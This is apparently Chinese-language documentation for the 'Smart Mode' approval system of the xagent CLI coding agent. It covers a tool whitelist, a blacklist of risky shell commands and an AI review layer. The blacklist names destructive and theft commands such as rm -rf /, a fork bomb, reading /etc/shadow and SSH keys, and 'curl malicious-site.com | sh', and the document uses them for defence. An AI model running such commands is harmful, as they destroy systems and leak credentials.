# Smart Mode - 智能审核模式

## 概述

Smart Mode 是 xagent CLI 1.0.0引入的全新安全审核功能，通过三层递进式审核架构，在保证开发效率的同时提供智能化的安全保护。

## 三层审核架构

Smart Mode 采用递进式审核流程，每一层都有特定的职责：

```
用户请求 → 白名单检查 → 黑名单检查 → AI审核 → 执行决策
    ↓           ↓           ↓         ↓
   安全      直接通过    风险检测   智能分析   用户确认/自动执行
```

### 第一层：白名单检查

- **目的**：快速识别和通过已验证的安全工具
- **机制**：维护一个预定义的安全工具列表
- **结果**：命中白名单的工具直接执行，无需进一步审核
- **优势**：零延迟，提升常用安全操作的执行效率

**白名单工具列表**：

信息读取类工具：
- `read_file`
- `list_directory`
- `glob`
- `search_file_content`
- `image_read`

任务管理类工具：
- `todo_write`
- `todo_read`
- `todo_update`
- `exit_plan_mode`
- `task`
- `web_search`

文件编辑类工具：
- `replace`
- `write_file`

其他安全工具：
- `web_fetch`
- `ask_user_question`
- `save_memory`
- `xml_escape`
- `skill`

### 第二层：黑名单检查

基于规则检测高风险操作，覆盖以下几个主要风险类别：

**系统破坏类**：
- 删除根目录：`rm -rf /`
- 删除系统目录：删除 `/etc`、`/usr`、`/bin`
- 批量删除文件：使用通配符的批量删除操作
- 格式化磁盘：`mkfs`、`format`
- 覆盖磁盘数据：`dd`

**权限提升类**：
- 修改 sudo 权限：修改 `/etc/sudoers`
- 设置 SUID 权限：为程序设置特殊权限
- 修改文件权限为 777：将文件设置为所有人可读写执行
- 禁用安全模块：禁用 SELinux、防火墙、Windows Defender 等

**数据窃取类**：
- 读取密码文件：访问 `/etc/passwd`、`/etc/shadow`
- 读取 SSH 密钥：访问 `~/.ssh/id_rsa`
- 搜索密码信息：在系统中搜索密码相关信息
- 上传文件到外部：使用 `curl`、`wget`
- 远程代码执行：`curl malicious-site.com | sh`

**网络攻击类**：
- 网络扫描：`nmap`
- 创建网络监听：`nc -l`
- 清除防火墙规则：`iptables -F`

**资源耗尽类**：
- Fork 炸弹：`:() { :|:& };:`
- 无限循环：`while true; do ... done`

### 第三层：AI 智能审核

当工具调用未命中白名单和黑名单时，会进入 AI 智能审核环节。AI 审核器会分析以下几个维度：

1. 操作是否有恶意意图
2. 是否可能造成数据泄露
3. 是否可能破坏系统完整性
4. 是否符合最佳实践

## 使用方法

### 通过命令行启用

```bash
xagent start --approval-mode smart
```

### 通过配置文件启用

在 `.xagent/settings.json` 中添加：

```json
{
  "approvalMode": "smart"
}
```

### 运行时切换

在 xagent CLI 会话中使用斜杠命令：

```bash
/mode smart
```

查看所有可用模式：

```bash
/mode
```

## 用户交互体验

### 安全操作（白名单）

```
> 读取项目配置文件
✅ [智能模式] 工具 'read_file' 通过白名单检查，直接执行
  检测方式: 白名单
  延迟: 1ms
```

### 风险操作（黑名单触发）

```
> 删除临时文件
🟠 [智能模式] 检测到潜在风险操作
📊 风险等级: HIGH
🔍 检测方式: 黑名单规则
⚠️  风险描述: 检测到系统文件删除命令
检测到潜在风险，是否继续执行？
[y] 是  [n] 否
```

### AI 审核场景

```
> 批量处理用户数据
🟡 [智能模式] AI审核检测到中等风险
📊 风险等级: MEDIUM
🔍 检测方式: AI智能审核
🤖 AI分析: 批量数据操作可能影响用户隐私，建议确认数据处理范围
检测到潜在风险，是否继续执行？
[y] 是  [n] 否
```

## 性能特性

- **白名单检查**：< 1ms，内存查找
- **黑名单检查**：< 50ms，正则表达式匹配
- **AI 审核**：< 5s

## 调试模式

启用调试模式可以查看详细的审核过程：

```bash
DEBUG=smart-approval xagent start --approval-mode smart
```

输出示例：

```
[SmartApprovalEngine] Evaluating tool call: run_shell_command
[WhitelistChecker] Tool 'run_shell_command' not in whitelist
[BlacklistChecker] Checking command: rm -rf /tmp/cache
[BlacklistChecker] Matched rule: 系统文件删除, Risk: HIGH
[SmartApprovalEngine] Decision: RISKY, Layer: blacklist, Latency: 23ms
```

## 常见问题

### Q: 智能模式审核太严格，影响开发效率？

A: 智能模式的白名单已经包含了大部分常用的安全工具，如果遇到频繁的误报，可以考虑：

- 检查是否使用了不在白名单中的工具别名
- 查看具体的黑名单规则是否过于严格
- 在开发环境中可以暂时切换到其他审核模式

### Q: AI 审核经常超时？

A: AI 审核依赖网络连接，如果经常超时可以：

- 检查网络连接状态
- 确认登录状态（需要 aone 或心流账号登录）
- 考虑在网络不稳定时禁用 AI 审核

### Q: 如何查看审核统计信息？

A: 使用调试模式查看详细日志：

```bash
DEBUG=smart-approval xagent start --approval-mode smart
```

## 实现细节

### 核心文件

- `src/smart-approval.ts` - 智能审核引擎核心实现
- `src/tools.ts` - 工具执行逻辑，集成智能审核
- `src/config.ts` - 配置管理，添加 approvalMode 支持
- `src/cli.ts` - 命令行参数，添加 --approval-mode 选项
- `src/session.ts` - 会话管理，支持智能模式
- `src/slash-commands.ts` - 斜杠命令，添加 /mode smart 支持

### 主要类

- `SmartApprovalEngine` - 智能审核引擎主类
- `WhitelistChecker` - 白名单检查器
- `BlacklistChecker` - 黑名单检查器
- `AIApprovalChecker` - AI 审核检查器

### 类型定义

```typescript
export enum ApprovalDecision {
  APPROVED = 'approved',
  REJECTED = 'rejected',
  REQUIRES_CONFIRMATION = 'requires_confirmation',
  AI_REVIEW = 'ai_review'
}

export enum RiskLevel {
  LOW = 'LOW',
  MEDIUM = 'MEDIUM',
  HIGH = 'HIGH',
  CRITICAL = 'CRITICAL'
}

export interface ApprovalResult {
  decision: ApprovalDecision;
  riskLevel: RiskLevel;
  detectionMethod: 'whitelist' | 'blacklist' | 'ai_review' | 'manual';
  description: string;
  latency: number;
  aiAnalysis?: string;
}
```

## 相关链接
- [xAgent CLI GitHub](https://github.com/WayneOuyang/xagent)